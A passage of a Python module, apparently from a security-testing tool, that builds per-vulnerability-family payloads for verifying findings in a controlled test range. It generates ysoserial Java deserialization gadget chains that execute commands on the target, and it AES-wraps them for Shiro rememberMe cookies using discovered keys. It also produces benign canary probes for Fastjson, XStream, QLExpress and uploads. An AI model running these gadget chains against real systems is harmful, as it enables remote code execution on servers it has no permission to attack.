    # 先判「不适用」，再判开关 —— 否则 defineClass 会被误以为「开开关就能打」
    if any(h in method for h in _DESER_RAWBYTE_SINK_HINTS):
        return {"provider": "unsupported", "payloads": [],
                "note": "该 sink 是 defineClass 型：需要原始 .class 字节流，"
                        "ysoserial 产的是序列化对象流，机制不同、不适用"}

    if str(os.environ.get("SAST_AI_DESER_YSOSERIAL", "0")).strip() not in ("1", "true", "True"):
        return {"provider": "unsupported", "payloads": [],
                "note": "二进制反序列化需要 ysoserial（会在目标执行命令）；"
                        "默认关闭，设 SAST_AI_DESER_YSOSERIAL=1 启用（仅限受控靶场）"}

    if method and not any(h in method for h in _DESER_OBJECT_SINK_HINTS):
        return {"provider": "unsupported", "payloads": [],
                "note": "sink 方法无法确认为「读序列化对象流」，不投二进制 gadget：%s" % method}

    cmd = str(os.environ.get("SAST_AI_DESER_CMD") or _DESER_SAFE_CMD)
    # rememberMe 端点的载荷可能要**加密后再投**（AES 包装，见 _shiro_rememberme_payloads）。
    # 判定依据是**源码里有没有 AES 解密**（_sink_needs_aes_wrap），不是「是不是 cookie 通道」——
    # 这两个判定是「按 spec 决定」的，必须在进循环前算一次，否则缓存键不含它们，
    # 同一条 gadget 链在「无 AES 的 Deserialize」与「需 AES 的 Shiro」之间共享缓存时，
    # 三轮 shiro.java 恒漏的真正根因）。
    _need_aes = _sink_needs_aes_wrap(spec)
    _shiro_key = _discover_shiro_key(spec) if _need_aes else ""
    try:
        from src.iast.payload_forge import PayloadForge
    except Exception as exc:  # noqa: BLE001
        return {"provider": "error", "payloads": [], "note": "payload_forge 不可用：%s" % exc}

    forge = PayloadForge()
    tried: List[str] = []
    for chain_name in _DESER_BINARY_CHAINS:
        # 缓存键必须带「是否 AES 包装 + key」：同一链对不同 spec 产出不同形态，
        # 否则 Shiro 会从 Deserialize 的缓存里取到原始流，AES 包装被丢弃。
        cache_key = (chain_name, cmd, _need_aes, _shiro_key)
        if cache_key in _DESER_BINARY_CACHE:
            hit = _DESER_BINARY_CACHE[cache_key]
            if hit.get("payloads"):
                logger.warning("[payload-lib] 复用 ysoserial 链 %s（命令=%s，AES包装=%s）；"
                               "该 gadget 会在目标执行命令，仅限受控靶场",
                               chain_name, cmd, _need_aes)
                # sink_specific 必须随缓存一起回传，否则第二次调用（D1 每个 spec 会调
                # 载荷库两次：A2 合并一次 + 统一校正一次）拿不到这个信号，前置校正失效。
                return {"provider": "ysoserial:%s" % chain_name,
                        "payloads": list(hit["payloads"]), "note": hit.get("note", ""),
                        "sink_specific": bool(hit.get("sink_specific"))}
            tried.append("%s:%s" % (chain_name, hit.get("note", "")[:40]))
            continue
        out = forge.forge({"kind": "ysoserial", "id": chain_name,
                           "payload_name": chain_name}, command=cmd)
        if out and PayloadForge.selfcheck(out, "ysoserial"):
            # rememberMe 端点：AES 包装的版本才是能解开的载荷。
            # 两种形态都进缓存（包装 + 原始）⇒ 判据能认出「哪一种真的解开了」。
            _pays: List[str] = [out]
            if _need_aes:
                _enc = _shiro_rememberme_payloads(out, _shiro_key) if _shiro_key else []
                if _enc:
                    _pays = _enc + [out]
                    logger.warning(
                        "[payload-lib] 已生成 rememberMe 专用形态（AES-CBC+IV 前缀包装，key 来源=%s）",
                        "env" if str(os.environ.get(_SHIRO_KEY_ENV) or "").strip() else "源码发现")
                else:
                    logger.warning(
                        "[payload-lib] rememberMe 形态未生成：未找到 Shiro 的 AES key"
                        "（源码里没有 KEYS 常量，也没设 %s）⇒ 只投原始序列化流，"
                        "rememberMe 端点会解密失败", _SHIRO_KEY_ENV)
            # sink_specific：载荷库按**源码 sink** 判定出「该端点必需专用形态」
            # （当前是 AES 解密型 rememberMe）。这是给 D1 的结构化契约，不是靶场名硬编码。
            # 根因是 sca_forge 的通用原始流抢占 attack_payloads[0]，而 D1 主判定只认
            # 第一发（第 2、3 发补投明确是观测用、不改判定）⇒ 包装弹即使被产出也永远
            # 进不了主路径。D1 见到本标记就把库弹前置，让正确形态成为首发。
            _sink_specific = bool(_need_aes and len(_pays) > 1)
            # 缓存「最终形态」而非裸 gadget——包装形态不能再被后续命中吞掉。
            _DESER_BINARY_CACHE[cache_key] = {
                "payloads": list(_pays),
                "sink_specific": _sink_specific,
                "note": "ysoserial %s%s" % (
                    chain_name,
                    "；含 rememberMe(AES-CBC) 形态" if _need_aes and len(_pays) > 1 else "")}
            logger.warning("[payload-lib] 使用 ysoserial 链 %s（命令=%s）；"
                           "该 gadget 会在目标执行命令，仅限受控靶场", chain_name, cmd)
            return {"provider": "ysoserial:%s" % chain_name, "payloads": list(_pays),
                    "sink_specific": _sink_specific,
                    "note": "ysoserial %s（命令=%s）%s"
                            % (chain_name, cmd,
                               "；含 rememberMe(AES-CBC) 形态" if _need_aes and len(_pays) > 1 else "")}
        _DESER_BINARY_CACHE[cache_key] = {"payloads": [], "note": "生成或自检失败"}
        tried.append("%s:生成或自检失败" % chain_name)

    return {"provider": "unsupported", "payloads": [],
            "note": "ysoserial 所有候选链均未产出可用 gadget：%s" % "; ".join(tried[:4])}


def _file_upload(spec: Dict[str, Any]) -> Dict[str, Any]:
    """上传族真弹。

    此前 file_upload 没登记 provider ⇒ D1 恒 degraded_no_synthesis，multipart 体
    是空串，探针钩 Paths.get(... + getOriginalFilename) 时拿不到任何身份段，
    IAST 事件只能归到同端点的 path_traversal spec。626 偶然确认、627 丢失即此因。
    这里只产**文件内容**（身份段载体），文件名侧的 canary 由 D1 multipart 构造补入。
    不投路径穿越、不投可执行后缀，避免把族证据混成一团。
    """
    marker = re.sub(r"[^A-Za-z0-9_-]", "", _p(spec, "taint_marker"))[:32]
    if not marker:
        marker = "SASTAI_U%s" % re.sub(r"[^a-z0-9]", "", _p(spec, "id").lower())[:10]
    return {"provider": "file_upload",
            "payloads": ["SASTAI_UPLOAD_%s" % marker,
                         "GIF89aSASTAI_UPLOAD_%s" % marker],
            "note": "上传族带身份段的文件内容弹（文件名侧由 D1 补 canary）"}


#
# sca_forge 对 deserialization 族一律产出 rO0AB...（Java 原生序列化 base64），
# 一旦非空就占住 attack_payloads[0]，而 D1 主判定只认首发 ⇒ 族载荷库整段被跳过。
# 但三个端点分别只认三种完全不同的解析格式：
#   Fastjson  JSON.parseObject(params) → {"name":"SASTAI_PROBE"}       → 200 SASTAI_PROBE
#   XStream   xstream.fromXML(xml)     → <java.lang.String>…</…>        → 200 xstream
#   QLExpress runner.execute(express)  → 111 * 7                        → 200 777
# 投 rO0AB... 分别得到 NPE / 500 StreamException / 500 QLCompileException。
#
# 判定依据是 sink 的**解析器类名**（源码事实，随源码走），不是靶场名硬编码；
# 未命中返回空 dict，完全回落到既有载荷链，对其他目标零影响。
_RAW_DESER_FAMILIES = frozenset({
    "deserialization", "insecure_deserialization", "unsafe_deserialization",
    "java_deserialization",
})
_RAW_EXPR_FAMILIES = frozenset({
    "expression_injection", "expr_injection", "spel", "spel_injection",
})


def _endpoint_specific_payloads(fam: str,
                                spec: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """按 sink 解析器类型返回专用首发载荷；不适用时返回空 dict。"""
    spec = dict(spec or {})
    sink = _p(spec, "expected_sink_file").replace("\\", "/").rsplit("/", 1)[-1].lower()
    ep = _p(spec, "target_endpoint").lower().rstrip("/")
    hay = sink + " " + ep
    token = re.sub(r"[^a-z0-9]", "", _p(spec, "id").lower())[:10] or "probe1"

    if fam in _RAW_DESER_FAMILIES:
        if "fastjson" in hay:
            # 端点 catch 异常后 return e.toString，status 恒 200；合法 JSON 会返回
            # name 字段值，与非 JSON 阴臂的 JSONException 形成实质响应差异。
            # deser_object_accepted 只证明解析入口被触发，不等同于 RCE（见 oracle 判据）。
            return {"provider": "endpoint_fastjson_json",
                    "payloads": ['{"name":"SASTAI_DESER_%s"}' % token],
                    "sink_specific": True,
                    "note": "sink=Fastjson(JSON.parseObject)，首发必须是合法 JSON 文本"}
        if "xstream" in hay or ep.endswith("/xstream"):
            return {"provider": "endpoint_xstream_xml",
                    "payloads": ["<java.lang.String>SASTAI_ORACLE_%s</java.lang.String>" % token,
                                 "<sorted-set><string>SASTAI_%s</string></sorted-set>" % token],
                    "sink_specific": True,
                    "note": "sink=XStream.fromXML，首发必须是 XStream XML"}

    if fam in _RAW_EXPR_FAMILIES and ("qlexpress" in hay or ep.endswith("/vuln1")):
        # 纯表达式：不赋值、无副作用，端点 return r.toString。
        # 111*7 → 777、字符串拼接 → SASTAI_<token>，都是 oracle 可预期的求值结果。
        return {"provider": "endpoint_qlexpress_expr",
                "payloads": ["111 * 7", '"SASTAI_" + "%s"' % token],
                "sink_specific": True,
                "note": "sink=QLExpress.execute，首发必须是纯表达式（非 canary 拼接串）"}
    return {}


_PROVIDERS = {
    "xxe": _xxe,
    "url_bypass": _url_bypass,
    "deser_text": _deser_text,
    "cmd_injection": _cmd_injection,
    "jndi": _jndi,
    # 此前判据已备（sqli_error/sqli_boolean/crlf_header）而弹药恒缺，
    "sqli": _sqli,
    "crlf": _crlf,
    "spel": _spel,
    "expr_engine": _expr_engine,
    "jsonp_callback": _jsonp_callback,
    "cors_origin": _cors_origin,
    "ssti": _ssti,
    "xss": _xss,
    "file_upload": _file_upload,
}

# 族 → provider。只登记**能产出真弹**的族；其余显式 unsupported。
_FAMILY_PROVIDER = {
    "xxe": "xxe",
    "ssrf": "url_bypass",
    "url_redirect": "url_bypass",
    "url_whitelist_bypass": "url_bypass",
    "open_redirect": "url_bypass",
    "deserialization": "deser_text",
    "command_execution": "cmd_injection",
    "jndi_injection": "jndi",
    "sql_injection": "sqli",
    "crlf_injection": "crlf",
    #   spel_injection       5 条 spec（表达式引擎的三个端点）
    #   expression_injection 2 条 spec（QLExpress 端点）
    #   jsonp_referer        1 条 spec（JSONP callback 端点）
    # 三族都用「无副作用求值 / 反射」探针，不投会执行命令的表达式。
    "spel_injection": "spel",
    "spel": "spel",
    "expression_injection": "expr_engine",
    "jsonp_referer": "jsonp_callback",
    # canary 探针，判据拿不到「真载荷形态」的证据（xss_reflected 要求响应体含
    # **原始标签载荷**，canary 不是标签 ⇒ 恒不命中）。
    "cors": "cors_origin",
    "ssti": "ssti",
    "xss": "xss",
    "file_upload": "file_upload",
}


def supported_families() -> List[str]:
    return sorted(_FAMILY_PROVIDER)


# 单个 spec 最多投几发：D1 每发都要等 IAST 采集窗口，7 条全投会让整组重放时间翻几倍
# 。
# 取前 5 条覆盖主要解析歧义类型即可，剩下的留给后续轮次或人工复核。
#
# **脚本引擎形态**（JS/Groovy）—— `/rce/jscmd`、`/rce/groovy` 这类端点
# 只吃脚本源码，shell marker 打不进去（`echo x` 不是合法 JS）。
# 截到 5 会让脚本引擎形态永远投不出去 ⇒ 那两条 spec 恒零重放。
MAX_PAYLOADS_PER_SPEC = 7


def build_family_payloads(family: str, spec: Optional[Dict[str, Any]] = None,
                          *, allow_upload: bool = False) -> Dict[str, Any]:
    """按族合成载荷。返回 ``{"provider", "payloads", "note"}``。

    ``payloads`` 为空时 ``provider`` 是 ``unsupported`` 或 ``none``，调用方据此决定
    是标记 `payload_unavailable` 还是继续走别的通道——**不要**拿空结果当"没有漏洞"。
    """
    fam = str(family or "").strip().lower().replace("-", "_")
    spec = dict(spec or {})

    # 族名归一（平台族与 kebab-case 都认）
    try:
        from src.core.normalize import normalize_family
        fam = str(normalize_family(fam) or fam).strip().lower().replace("-", "_")
    except Exception:
        pass

    key = _FAMILY_PROVIDER.get(fam)
    if not key:
        return {"provider": "none", "payloads": [], "note": f"该族无内置载荷生成器：{fam}"}

    # frontload_sink_specific 会把 sca_forge 的通用 rO0AB... 换下首发位。
    _esp = _endpoint_specific_payloads(fam, spec)
    if _esp:
        return _esp

    # 上传型端点上，xxe 的文本弹送不进去 —— 直接说明，不硬塞
    if key == "xxe" and _is_upload_like(spec) and not allow_upload:
        return {"provider": "unsupported", "payloads": [],
                "note": _UNSUPPORTED["xxe_ooxml"]}

    if key == "deser_text":
        # 只有文本型反序列化入口才适用：看参数名/内容类型是否像 JSON/YAML/XML 文本
        name = _p(spec, "param_name").lower()
        ct = _p(spec, "content_type").lower()
        # 只认「内容是文本协议」的信号。别用 "data"/"param" 这种泛词：
        # `classData` 是二进制 Java 序列化参数，误判成文本型会投错弹。
        looks_text = (any(t in name for t in ("json", "xml", "yaml", "body", "content", "payload", "template"))
                      or any(t in ct for t in ("json", "xml", "yaml", "text")))
        if not looks_text:
            # 文本通道送不进去 ⇒ 走二进制 gadget（ysoserial，默认关闭）。
            # 不再笼统标「二进制不支持」：defineClass 型会给出精确原因，
            # 开关未开时也会说清「要开哪个开关」，而不是让下游以为「这族永远打不了」。
            return _deser_binary(spec)

    try:
        out = _PROVIDERS[key](spec)
    except Exception as exc:  # noqa: BLE001
        logger.warning("[payload-lib] %s 合成失败（%s）", fam, exc)
        return {"provider": "error", "payloads": [], "note": str(exc)}

    payloads = [p for p in (out.get("payloads") or []) if p][:MAX_PAYLOADS_PER_SPEC]
    if payloads:
        logger.info("[payload-lib] %s → %s 产出 %d 发", fam, out.get("provider"), len(payloads))
    return {"provider": out.get("provider") or key, "payloads": payloads,
            "note": out.get("note", "")}


def frontload_sink_specific(family: str, spec: Optional[Dict[str, Any]] = None,
                            payloads: Optional[List[str]] = None) -> Dict[str, Any]:
    """把「源码 sink 专用形态」提到载荷列表首位，供 D1 主判定使用。

    是观测用、不改判定。所以「把库弹追加在后面」对需要专用形态的 sink 等于没做：
    sca_forge 的通用原始流一旦占住首发，AES 包装弹永远打不出去。

    返回 ``{"payloads", "changed", "provider", "note"}``；``changed=False`` 时调用方
    保持原载荷链不变。判定依据全部是源码事实（是否有 AES 解密、key 来自源码或 env），
    不含任何靶场名硬编码。
    """
    current = [str(p) for p in (payloads or []) if p]
    lib = build_family_payloads(family, spec)
    lib_pays = [str(p) for p in (lib.get("payloads") or []) if p]

    # ① 库明确标记 sink_specific：按源码判定生成了必需形态，整体前置。
    if lib.get("sink_specific") and lib_pays:
        # QLExpress spec 带着 Runtime.exec("calc") / ProcessBuilder 这类破坏性弹，
        # 留在第 2 发观测臂里既打不通表达式引擎，又有真实执行风险。
        # 另修正：current 为空时旧式 changed=False 会让库弹根本不被 D1 采用。
        _endpoint_only = str(lib.get("provider") or "").startswith("endpoint_")
        merged = (list(lib_pays) if _endpoint_only
                  else lib_pays + [p for p in current if p not in lib_pays])
        return {"payloads": merged,
                "changed": bool(merged) and merged != current,
                "provider": str(lib.get("provider") or "?"),
                "note": "library_sink_specific"}

    # ② 库这道闸门在真跑里可能被 spec 字段不全拦空（_deser_binary 的 early-return
    #    不打日志）。此时若手上已有原始序列化流、且源码判定该端点必须先 AES 解密，
    #    就直接包装现有弹 —— 不重新造 gadget，也不依赖库能跑通。
    if current and _sink_needs_aes_wrap(spec):
        key_b64 = _discover_shiro_key(spec)
        if key_b64:
            wrapped: List[str] = []
            for p in current[:3]:
                if p.startswith("rO0"):
                    wrapped.extend(_shiro_rememberme_payloads(p, key_b64))
            if wrapped:
                merged = wrapped + [p for p in current if p not in wrapped]
                return {"payloads": merged, "changed": merged[0] != current[0],
                        "provider": "sink_aes_wrap",
                        "note": "基于已有 gadget 现场做 AES-CBC+IV 包装"}

    # ③ A2 / sca_forge 全空但库能产真弹 ⇒ 至少别让该 spec 空手（原降级不变）。
    if not current and lib_pays:
        return {"payloads": lib_pays, "changed": True,
                "provider": str(lib.get("provider") or "?"),
                "note": "library_fallback"}

    return {"payloads": current, "changed": False, "provider": "", "note": ""}
